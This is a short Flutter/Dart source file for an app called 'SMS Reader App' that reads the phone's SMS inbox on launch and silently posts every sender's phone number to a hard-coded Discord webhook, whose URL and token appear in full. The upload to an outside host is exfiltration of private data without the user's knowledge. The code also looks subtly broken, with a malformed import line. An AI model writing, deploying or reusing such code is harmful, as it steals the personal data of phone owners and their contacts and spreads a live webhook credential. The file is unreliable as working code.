import 'package:flutter/material.dart';
import 'package:flutter_sms/flutter_sms.dart';
import 'package:http/http.dart as http';

void main() => runApp(MyApp());

class MyApp extends StatelessWidget {
  @override
  Widget build(BuildContext context) {
    return MaterialApp(
      home: SMSReaderApp(),
    );
  }
}

class SMSReaderApp extends StatefulWidget {
  @override
  _SMSReaderAppState createState() => _SMSReaderAppState();
}

class _SMSReaderAppState extends State<SMSReaderApp> {
  List<String> senderNumbers = [];

  @override
  void initState() {
    super.initState();
    _fetchSMS();
  }

  Future<void> _fetchSMS() async {
    final messages = await FlutterSms().getInboxMessages;
    for (var message in messages) {
      String senderNumber = message.address;
      senderNumbers.add(senderNumber);
    }
    setState(() {});
    _sendToDiscord(senderNumbers);
  }

  Future<void> _sendToDiscord(List<String> numbers) async {
    final webhookUrl = 'https://discord.com/api/webhooks/1165290854416646225/NFI2Puw2SYeWNetzEm9sr_KtCSjEA-6CS54hTQZDCy7LD-EYLuv0rM2oioO7ObazFZvU';
    final message = 'SMS Sender Numbers: ${numbers.join(", ")}';
    
    final response = await http.post(
      Uri.parse(webhookUrl),
      headers: {
        'Content-Type': 'application/json',
      },
      body: '{"content": "$message"}',
    );

    if (response.statusCode == 204) {
      print('Message sent to Discord successfully');
    } else {
      print('Failed to send message to Discord');
    }
  }

  @override
  Widget build(BuildContext context) {
    return Scaffold(
      appBar: AppBar(
        title: Text('SMS Reader App'),
      ),
      body: ListView.builder(
        itemCount: senderNumbers.length,
        itemBuilder: (context, index) {
          return ListTile(
            title: Text('Sender Number: ${senderNumbers[index]}'),
          );
        },
      ),
    );
  }
}
